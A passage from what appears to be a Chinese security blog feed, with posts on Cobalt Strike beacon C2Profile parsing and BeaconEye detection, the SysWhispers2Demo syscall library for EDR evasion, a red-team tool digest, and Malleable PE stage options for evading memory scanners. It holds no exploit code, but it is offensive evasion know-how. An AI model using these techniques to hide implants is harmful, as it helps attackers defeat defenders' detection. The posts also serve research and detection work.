的stage模式从loader通过CreateThread执行beacon。经过一小段shellcode之后，执行<code>ReflectiveLoader</code>，在<code>ReflectiveLoader</code>处理完PE数据之后，其实是跳转到了DllEntryPoint函数。此处将重点分析beacon对于C2Profile的解析过程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;很显然，在beacon中，第一个函数的作用是定位当前EIP,第二个函数即就是<code>ReflectiveLoader</code>,经过对PE的一些处理之后，最后会执行<code>DllEntryPoint</code>.<br>    <img src="http://hacky.wang/blog/20220623/kxXhOy4zXodd.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/tblBaWchlHIo.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在dwReason为1的时候初始化C2Profile数据，在<code>Sub_339762_Parse_C2Profile</code>函数中，很显然，可以看到将C2Profile进行了解密。在内存中，大概还是以 index，type，length，value的顺序进行分布。<br>    <img src="http://hacky.wang/blog/20220623/Co980Xfz8Qft.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/E6oG4a0EWkvk.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后读取整个解密数据，解析出type和value，只将这两项目保存到刚刚malloc的内存中。并且将type和value从偏移为8的地址处开始保存。而这一部分数据的分布顺序就是一些检测工具，例如BeaconEye的检测原理。<br>    <img src="http://hacky.wang/blog/20220623/AMvYidsfiWhw.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/3ezQKal3H90V.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其实，往下面翻一番是能找到所链接的server的。<br>    <img src="http://hacky.wang/blog/20220623/P22QPaHCPWFk.png?imageslim" alt="mark"></p><h2 id="0x04-BeaconEye原理分析"><a href="#0x04-BeaconEye原理分析" class="headerlink" title="0x04 BeaconEye原理分析"></a>0x04 BeaconEye原理分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BeaconEye使用C#开发，通过使用yara规则，检测beacon解析之后的C2Profile数据分布实现的。因为libyaraNET库没有x86版本，所以BeaconEye务必编译成X64版本，才可以通过。<br>    <img src="http://hacky.wang/blog/20220623/aa4p8A9xCnKh.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以x86的yara规则举例子，yara第一段为全0，因为C2Profile数据是从+0x08处开始复制的，所以前八个字节没有数据为全0，剩下的数据就很简单了，根据解析C2Profile的变量类型来看，前六个数据类型分别是short，short，int，int，short，short对应的type分别是01，01,02,02,01,01。这样就是检测的原理。<br>    <img src="http://hacky.wang/blog/20220623/ULBCsrwcULaa.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/SXcP7yx4SrxN.png?imageslim" alt="mark"></p><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><ul><li><a href="https://blog.51cto.com/u_15274949/2931535" target="_blank" rel="external">CobaltStrike二次开发环境初探</a></li><li><a href="https://xz.aliyun.com/t/10784" target="_blank" rel="external">CobaltStrike逆向学习系列(2)：Stageless Beacon 生成流程分析</a></li><li><a href="https://xz.aliyun.com/t/10785" target="_blank" rel="external">CobaltStrike逆向学习系列(3)：Beacon C2Profile 解析</a></li><li><a href="https://xz.aliyun.com/t/10832" target="_blank" rel="external">CobaltStrike逆向学习系列(5)：Bypass BeaconEye</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言与背景&quot;&gt;&lt;a href=&quot;#0x00-前言与背景&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言与背景&quot;&gt;&lt;/a&gt;0x00 前言与背景&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;本文没有什么创新，只是在学习beacon生成和调试分析和检测beacon的过程中的一些记录。本文首发于跳跳糖安全社区(&lt;a href=&quot;https://tttang.com/archive/1631/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://tttang.com/archive/1631/&lt;/a&gt;)&lt;/p&gt;
    
    </summary>
    
      <category term="攻防技术" scheme="https://findream.github.io/categories/%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>SysWhispers2Demo 简介</title>
    <link href="https://findream.github.io/2022/06/25/SysWhispers2Demo/"/>
    <id>https://findream.github.io/2022/06/25/SysWhispers2Demo/</id>
    <published>2022-06-25T06:02:11.000Z</published>
    <updated>2022-06-25T14:32:29.489Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-项目简介"><a href="#0x00-项目简介" class="headerlink" title="0x00 项目简介"></a>0x00 项目简介</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SysWhispers2Demo是通过逆向分析kernel32.dll或者kernelbase.dll文件，从而仿写部分Win32 API的实现逻辑，以解决部分SysWhispers2使用者在利用SysWhispers2做EDR规避时候所遇到的开发困难。SysWhispers2Demo在仿写Win32 API的时候，<strong>部分采用最小开发原则</strong>，即部分参数需要使用微软API文档所约定的默认参数，以减轻仿写的工作量。项目地址:<a href="https://github.com/findream/SysWhispers2Demo" target="_blank" rel="external">https://github.com/findream/SysWhispers2Demo</a></p><a id="more"></a><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://github.com/jthuraisamy/SysWhispers2" target="_blank" rel="external">SysWhispers2</a>主要是由jthuraisamy开发的通过Syscall用来规避EDR。SysWhispers2使用很方便，无需指定windows 操作系统版本，只需要通过syswhispers.py生成Nt*函数所需要的函数参数，调用约定等。但是，Ring3的逻辑需要自己实现，这就是SysWhispers2Demo的目的。</p><h2 id="0x01-文件描述"><a href="#0x01-文件描述" class="headerlink" title="0x01 文件描述"></a>0x01 文件描述</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SysWhispers2Demo主要有3个文件<code>SysWhispers2Demo.cpp</code>,<code>SysWhispers2Demo.h</code>,<code>prototypes.h</code>。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SysWhispers2Demo.cpp文件是Ring3层的实现逻辑。目前，主要实现了包括文件操作，注册表操作，进程操作，以及线程操作。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 文件操作，基本实现了文件的创建，读写，删除等操作，具体支持的Win32 API如下：<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">CreateFileA</span></div><div class="line"><span class="attribute">CreateFileW</span></div><div class="line"><span class="attribute">ReadFile</span></div><div class="line"><span class="attribute">WriteFile</span></div><div class="line"><span class="attribute">NtQueryInformationFile</span></div><div class="line"><span class="attribute">NtSetInformationFile</span></div><div class="line"><span class="attribute">NtOpenFile</span></div><div class="line"><span class="attribute">NtQueryDirectoryFile</span></div><div class="line"><span class="attribute">DeleteFileA</span></div><div class="line"><span class="attribute">DeleteFileW</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 注册表操作，也实现了注册表使用的常见API函数,支持两种ANSI和UNICODE字符。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">RegCreateKeyExA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegCreateKeyA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegSetValueExA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegDeleteValueA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegQueryValueExA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegOpenKeyExA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegOpenKeyA</span><span class="params">(W)</span></span></div><div class="line">RegCloseKey</div><div class="line"><span class="function"><span class="title">RegQueryInfoKeyA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegEnumKeyExA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegEnumKeyA</span><span class="params">(W)</span></span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 进程操作，也实现了常见的进程使用的API函数。<strong><em>因为CreateProcess内部实现的过于复杂，目前仅仅实现了能创建进程，但是创建进程之后，需要传出的参数，如ProcessInformation没有实现</em></strong><br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">CreateProcessA</span><span class="params">(W)</span></span></div><div class="line">WinExec</div><div class="line">OpenProcess</div><div class="line">TerminateProcess</div><div class="line">ReadProcessMemory</div><div class="line">WriteProcessMemory</div><div class="line">GetExitCodeProcess</div><div class="line">GetLogicalProcessorInformation</div><div class="line">GetProcessAffinityMask</div><div class="line">IsWow64Process</div><div class="line">GetProcessId</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;线程操作，也实现了常见的线程使用的API函数。<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">CreateThread</span></div><div class="line"><span class="attribute">CreateRemoteThreadEx</span></div><div class="line"><span class="attribute">ResumeThread</span></div><div class="line"><span class="attribute">OpenThread</span></div><div class="line"><span class="attribute">GetThreadContext</span></div><div class="line"><span class="attribute">GetExitCodeThread</span></div><div class="line"><span class="attribute">GetProcessIdOfThread</span></div><div class="line"><span class="attribute">TerminateThread</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SysWhispers2Demo.h是头文件，包含了SysWhispers2Demo.cpp的函数声明，和库所需要Nt*函数指针。前面typedef包含的是函数指针，后面是函数声明。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了增强开发的方便程度，SysWhispers2Demo采用的是和win32 API同样的函数原型，使用SysWhispers2Demo就像使用原生的Win32一模一样。仅仅需要在你所需要的Win32 API名称后面加一个Stub以示区别，例如，假如需要使用NtCreateFile创建文件，那么在Ring3需要调用CreateFileA，那只需要调用SysWhispers2Demo内置的CreateFileA_Stub。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;prototypes.h包含的是一些所需要的变量类型等数据。这个是我删除了ntdll.h文件的函数声明。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面三个文件，在使用的时候，需要导入新项目。除此以外，还有两个文件，ntdll.h存储了一些函数声明和遍历类型，使用者可以在这里查看函数原型。而main.cpp我写的部分测试用例，是关于部分Win32 API的使用。<strong>这两个文件不需要导入项目。</strong></p><h2 id="0x02-使用步骤"><a href="#0x02-使用步骤" class="headerlink" title="0x02 使用步骤"></a>0x02 使用步骤</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SysWhispers2Demo仅仅支持x64，x86在Syscall会遇到莫名其妙的问题，可以解决，但是不具有通用性，暂时不考虑支持x86。在win10 x64 vs2017编译通过。其他未测。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在你使用SysWhispers2生成了文件之后，假设生成了文件是<code>syscall.c</code>,<code>syscall.h</code>，以及<code>syscall.asm</code>。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第一步，在生成的syscall.h文件中，删除所有的变量定义。因为SysWhispers2会生成变量定义，而SysWhispers2Demo也带有变量定义，两者会冲突。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二歩，在生成的Syscall.h文件中，导入prototypes.h头文件。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第三歩，在SysWhispers2Demo库文件SysWhioers2Demo.c文件中，导入syscall.h头文件，目的是修改链接的Nt函数。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第四步，注释SysWhispers2Demo库文件SysWhioers2Demo.c文件中，指定函数的动态获取函数地址的语句。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;除此以外，也可以选择直接Copy SysWhispers2Demo.cpp中，你想要使用的函数。 No Care！这应该是最容易的。</p><h2 id="0x03-版本信息"><a href="#0x03-版本信息" class="headerlink" title="0x03 版本信息"></a>0x03 版本信息</h2><h3 id="v0-1-0（2022-06-20）"><a href="#v0-1-0（2022-06-20）" class="headerlink" title="v0.1.0（2022-06-20）"></a>v0.1.0（2022-06-20）</h3><ul><li>初始版本，支持常见的文件，注册表，进程，线程 API操作。</li></ul><h2 id="0x04-协议"><a href="#0x04-协议" class="headerlink" title="0x04 协议"></a>0x04 协议</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;直接用就是了。</p><h2 id="0x05-FAQ"><a href="#0x05-FAQ" class="headerlink" title="0x05 FAQ"></a>0x05 FAQ</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;欢迎大家提PR</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果还有需要实现的kernel层API函数，或者bug，欢迎联系wanghacky@qq.com。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-项目简介&quot;&gt;&lt;a href=&quot;#0x00-项目简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 项目简介&quot;&gt;&lt;/a&gt;0x00 项目简介&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;SysWhispers2Demo是通过逆向分析kernel32.dll或者kernelbase.dll文件，从而仿写部分Win32 API的实现逻辑，以解决部分SysWhispers2使用者在利用SysWhispers2做EDR规避时候所遇到的开发困难。SysWhispers2Demo在仿写Win32 API的时候，&lt;strong&gt;部分采用最小开发原则&lt;/strong&gt;，即部分参数需要使用微软API文档所约定的默认参数，以减轻仿写的工作量。项目地址:&lt;a href=&quot;https://github.com/findream/SysWhispers2Demo&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/findream/SysWhispers2Demo&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="windows 攻防" scheme="https://findream.github.io/categories/windows-%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>绿盟科技-每周蓝军技术推送（2022.5.28-6.2）学习</title>
    <link href="https://findream.github.io/2022/06/14/%E7%BB%BF%E7%9B%9F%E7%A7%91%E6%8A%80-%E6%AF%8F%E5%91%A8%E8%93%9D%E5%86%9B%E6%8A%80%E6%9C%AF%E6%8E%A8%E9%80%81%EF%BC%882022.5.28-6.2%EF%BC%89/"/>
    <id>https://findream.github.io/2022/06/14/绿盟科技-每周蓝军技术推送（2022.5.28-6.2）/</id>
    <published>2022-06-14T06:02:11.000Z</published>
    <updated>2022-06-14T13:09:49.756Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-绿盟科技-每周蓝军技术推送（2022-5-28-6-2）"><a href="#0x00-绿盟科技-每周蓝军技术推送（2022-5-28-6-2）" class="headerlink" title="0x00 绿盟科技-每周蓝军技术推送（2022.5.28-6.2）"></a>0x00 绿盟科技-每周蓝军技术推送（2022.5.28-6.2）</h2><ul><li>原文链接：<a href="https://mp.weixin.qq.com/s/aZ3Af7xHOuqKGI_R89U0Fg" target="_blank" rel="external">每周蓝军技术推送（2022.5.28-6.2</a></li><li>这一周的内容推送主要是一些工具推荐</li><li>释放UDRL（用户定义反射加载器）内存的BOF</li><li>基于低熵的香农编码隐藏shellcode</li><li>Cobalt Strike Beacon 的用户定义反射加载器，伪造线程起始地址并在执行入口点后释放</li><li>C# 编写的 COM 劫持持久化辅助工具<a id="more"></a></li></ul><h2 id="0x01-调试和逆向ALPC"><a href="#0x01-调试和逆向ALPC" class="headerlink" title="0x01 调试和逆向ALPC"></a>0x01 调试和逆向ALPC</h2><ul><li>ALPC调试比较复杂没有仔细看。除了<a href="https://csandker.io/2022/05/29/Debugging-And-Reversing-ALPC.html" target="_blank" rel="external">这篇文章(调试和逆向ALPC)</a>之外，还有<a href="https://bbs.pediy.com/thread-268225.htm" target="_blank" rel="external">win10 1909逆向（ALPC通信原理浅析</a>等可以参考。</li></ul><h2 id="0x02-freeBokuLoader：释放UDRL（用户定义反射加载器）内存的BOF"><a href="#0x02-freeBokuLoader：释放UDRL（用户定义反射加载器）内存的BOF" class="headerlink" title="0x02 freeBokuLoader：释放UDRL（用户定义反射加载器）内存的BOF"></a>0x02 freeBokuLoader：释放UDRL（用户定义反射加载器）内存的BOF</h2><ul><li>这就是一个释放UDRL(用户定义反射加载器)的BOF。</li><li>BOF:即Beacon Object Files。是c编译后的文件，其有点就是小，可以在beacon内部使用，缺点就是会引发beacon崩溃。</li><li>关于BOF，可以看官方出的<a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm" target="_blank" rel="external">文章</a></li></ul><h2 id="0x03-Shelltropy：基于低熵的香农编码隐藏shellcode"><a href="#0x03-Shelltropy：基于低熵的香农编码隐藏shellcode" class="headerlink" title="0x03 Shelltropy：基于低熵的香农编码隐藏shellcode"></a>0x03 Shelltropy：基于低熵的香农编码隐藏shellcode</h2><ul><li>一个概念：信息熵/香农熵：一组信息中随机性的量度，信息越随机，熵越高。</li><li>一个重要结论：bin通过加密混淆或者加壳，会导致信息熵增加。多数恶意软件，信息熵偏高。</li><li>如何降低熵，规避EDR：之前了解过，将加密数据嵌入正常的可执行文件可以避免高熵。</li><li>Shelltropy作者所写的<a href="https://kleiton0x00.github.io/posts/The-more-predictable-you-are-the-less-you-are-able-to-get-detected/" target="_blank" rel="external">文章</a>的思路是通过向高熵的数据中插入低熵的数据，可以将整体的熵降低。但是这么做会使shellcode增大一倍。<br> <img src="http://hacky.wang/blog/20220613/Lk1z89W0zf5w.png?imageslim" alt="mark"></li><li>Ref：<a href="https://github.com/kleiton0x00/Shelltropy/blob/main/README.md" target="_blank" rel="external">https://github.com/kleiton0x00/Shelltropy/blob/main/README.md</a></li></ul><h2 id="0x04-KaynStrike：Cobalt-Strike-Beacon-的用户定义反射加载器，伪造线程起始地址并在执行入口点后释放"><a href="#0x04-KaynStrike：Cobalt-Strike-Beacon-的用户定义反射加载器，伪造线程起始地址并在执行入口点后释放" class="headerlink" title="0x04 KaynStrike：Cobalt Strike Beacon 的用户定义反射加载器，伪造线程起始地址并在执行入口点后释放"></a>0x04 KaynStrike：Cobalt Strike Beacon 的用户定义反射加载器，伪造线程起始地址并在执行入口点后释放</h2><ul><li><a href="https://github.com/Cracked5pider/KaynStrike" target="_blank" rel="external">KaynStrike</a>设计确实很巧妙，首先，工具分段把PE数据写入当前进程空间，然后拉起一个线程，并将EIP设置成之前那段数据的入口点，Resume之后，便执行了beacon代码，之后，主线程这边采用同样的方法执行NtFreeVirtualMemoryAPI函数，进行free。</li></ul><h2 id="0x05-COM-Hunter：C-编写的-COM-劫持持久化辅助工具"><a href="#0x05-COM-Hunter：C-编写的-COM-劫持持久化辅助工具" class="headerlink" title="0x05 COM-Hunter：C# 编写的 COM 劫持持久化辅助工具"></a>0x05 COM-Hunter：C# 编写的 COM 劫持持久化辅助工具</h2><ul><li><a href="https://github.com/nickvourd/COM-Hunter" target="_blank" rel="external">https://github.com/nickvourd/COM-Hunter</a>阅读了该工具的部分源码，其[内置]了一些可以被COM劫持的CLSID列表，没什么可说的。关于如何狩猎可以被COM劫持的CLSID可以参考<a href="https://www.4hou.com/posts/Mo51" target="_blank" rel="external">持久性COM劫持的实现 - 嘶吼</a>等文章，除此以外<a href="https://github.com/findream/SecStudy/blob/main/ATT-CK/Remote-ComHiJack/ReadMe.md" target="_blank" rel="external">我的github</a>上有一个可以远程狩猎COM劫持的工具。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-绿盟科技-每周蓝军技术推送（2022-5-28-6-2）&quot;&gt;&lt;a href=&quot;#0x00-绿盟科技-每周蓝军技术推送（2022-5-28-6-2）&quot; class=&quot;headerlink&quot; title=&quot;0x00 绿盟科技-每周蓝军技术推送（2022.5.28-6.2）&quot;&gt;&lt;/a&gt;0x00 绿盟科技-每周蓝军技术推送（2022.5.28-6.2）&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;原文链接：&lt;a href=&quot;https://mp.weixin.qq.com/s/aZ3Af7xHOuqKGI_R89U0Fg&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;每周蓝军技术推送（2022.5.28-6.2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;这一周的内容推送主要是一些工具推荐&lt;/li&gt;
&lt;li&gt;释放UDRL（用户定义反射加载器）内存的BOF&lt;/li&gt;
&lt;li&gt;基于低熵的香农编码隐藏shellcode&lt;/li&gt;
&lt;li&gt;Cobalt Strike Beacon 的用户定义反射加载器，伪造线程起始地址并在执行入口点后释放&lt;/li&gt;
&lt;li&gt;C# 编写的 COM 劫持持久化辅助工具
    
    </summary>
    
      <category term="攻防技术" scheme="https://findream.github.io/categories/%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>CobaltStrike Malleable PE</title>
    <link href="https://findream.github.io/2022/06/06/CobaltStrike%20Malleable%20PE/"/>
    <id>https://findream.github.io/2022/06/06/CobaltStrike Malleable PE/</id>
    <published>2022-06-06T04:02:11.000Z</published>
    <updated>2022-09-14T13:19:51.905Z</updated>
    
    <content type="html"><![CDATA[<ul><li>本文转载于跳跳糖安全社区，原文链接为<a href="https://tttang.com/archive/1662/" target="_blank" rel="external">https://tttang.com/archive/1662/</a></li></ul><a id="more"></a><h2 id="0x00-Malleable-PE"><a href="#0x00-Malleable-PE" class="headerlink" title="0x00 Malleable PE"></a>0x00 Malleable PE</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Malleable PE 直译就是可拓展PE，通常来说，很多同学在做免杀的时候，会针对Loader进行免杀，并不会考虑针对beacon进行免杀，这就导致了很多杀软/EDR的内存防护能针对默认设置的beacon进行查杀。C2Profile提供了很好地操作beacon的方法，C2Profile不仅仅可以自定义beacon的通信属性(例如uri，header等等)，还可以对beacon进行操作，从而实现免杀的目的。</p><h2 id="0x01-stage指标"><a href="#0x01-stage指标" class="headerlink" title="0x01 stage指标"></a>0x01 stage指标</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C2Profile文件的stage块控制beacon的相关属性。如下图是官方文档提供的默认stage块。这个默认配置中，大概配置了一下几个属性，<code>userwx</code>,<code>complie_time</code>,<code>image_size_x86</code>,<code>image_size_x64</code>,<code>obfuscate</code>等等。这几个属性可以决定beacon部分PE属性和部分操作。<br>    <img src="http://hacky.wang/blog/20220630/hxa1MphY2grr.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>transform-x86</code>或者<code>transform-x64</code>可以修改反射dll的数据。这两个块支持3个命令，<code>prepend</code>,<code>append</code>,<code>strrep</code>。<code>prepend</code>是在beacon之前添加字节数据，这样可以规避那些单纯检测内存开头部分数据的EDR。<code>append</code>是在beacon数据之后添加额外的数据，而<code>strrep</code>则是替换字符串操作，其实很多厂商会将beacon的导出函数<code>ReflectiveLoader</code>作为检测的一个点，具体可以看flu0rite的<a href="https://xz.aliyun.com/t/9224?page=1" target="_blank" rel="external">记一次cs bypass卡巴斯基内存查杀</a>，这篇文章详细介绍了卡巴针对beacon的内存查杀的特征，其中就有<code>ReflectiveLoader</code>。<br>    <img src="http://hacky.wang/blog/20220630/EbHMotGsr3a0.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;除此以外呢，stage还可以将字符串添加到beacon的.rdata段。<br>    <img src="http://hacky.wang/blog/20220630/qEkEY6sSbP5A.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下面是针对stage块的一些配置属性。</p><ul><li>checksum：Beacon的PE的检验和</li><li>cleanup：释放反射dll的内存</li><li>compile_time：编译时间</li><li>entry_point：入口点</li><li>image_size_x86(image_size_x64)：Beacon的PE的SizeOfImage(映像大小)</li><li>module_x86(module_x64)：默认情况下，beacon是通过VirtualAlloc开辟内存的，如果设置module_x86属性，就可以Load module_x86指定的模块，然后将beacon复写到该模块的内存区域。</li><li>name：决定beacon dll导出表的名字</li><li>obfuscate：加密beacon Dll的导入表，复写未使用的header内容，以及让ReflectiveLoader将beacon拷贝到新的内存区域</li><li>rich_header：rich_header是<code>PE</code>这个MagicNumber后面的pe数据</li><li>sleep_mask：在sleep之前混淆beacon，避免内存查杀</li><li>smartinject： Beacon 将关键函数指针（如 GetProcAddress 和 LoadLibrary）嵌入到同架构的post-ex DLL中。 这使 post-ex DLL可以在新进程中进行自我引导，而不会出现类似shellcode的行为，如使用PEB寻找kernel32.dll和其中的函数指针。</li><li>stomppe：在加载完beacon之后，修改Characteristic值</li><li>userwx：是否使用RWX权限，RWX容易引起怀疑</li><li>allocator：控制Beacon反射加载器初始化时使用的内存分配函数（VirtualAlloc，HeapAlloc，MapViewOfFile）默认使用VirtualAlloc函数<br>  <img src="http://hacky.wang/blog/20220630/GhPeDSNxAakM.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20220630/ePky5vsJ8Gou.png?imageslim" alt="mark"></li></ul><h2 id="0x02-C2Profile加载"><a href="#0x02-C2Profile加载" class="headerlink" title="0x02 C2Profile加载"></a>0x02 C2Profile加载</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TeamServer负责加载C2Profile文件，IDEA中找到server/TeamServer.java，在绿色三角启动调试，注意，在debug窗口中，点击扳手按钮，以设置调试选项。依次设置VM Optional，可以将TeamServer这个文件的设置直接复制进去，我这里设置的是<code>-XX:ParallelGCThreads=4 -Dcobaltstrike.server_port=50050 -Djavax.net.ssl.keyStore=./cobaltstrike.store -Djavax.net.ssl.keyStorePassword=123456 -XX:+AggressiveHeap -XX:+UseParallelGC</code>。然后添加主类，最后添加要调试的参数即可。<br>    <img src="http://hacky.wang/blog/20220630/d3k6KhQYc8Xf.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220630/rtCalYbVwiGu.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先判断端口是否有效。然后加载C2Profile文件。<br>    <img src="http://hacky.wang/blog/20220630/00rW7h5HLjUK.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220630/l17Wg2J7Ptga.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将C2Profile文件按行读取，以’\n’分割。<br>    <img src="http://hacky.wang/blog/20220630/kkK6cUEDOxUo.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后对C2Profile进行解析，首先对Profile这个结构体进行初始化，这里面存储的是一些默认的C2Profile设置。然后调用Loader.parse进行解析读取到的C2Profile文件内容，<br>    <img src="http://hacky.wang/blog/20220630/bYFLB42ewHks.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220630/Q14vf6lmHawU.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这就是最后解析结果，最后在<code>TeamServer.go()</code>注册监听器(Listeners)，Beacons，Phisher等组件。最后建立监听，等待GUI进行链接。然后建立客户端的认证，然后拉起线程和客户端进行socket链接。<br>    <img src="http://hacky.wang/blog/20220630/CbwJqd5hRMF7.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220630/tJ8A51A60QX7.png?imageslim" alt="mark"></p><h2 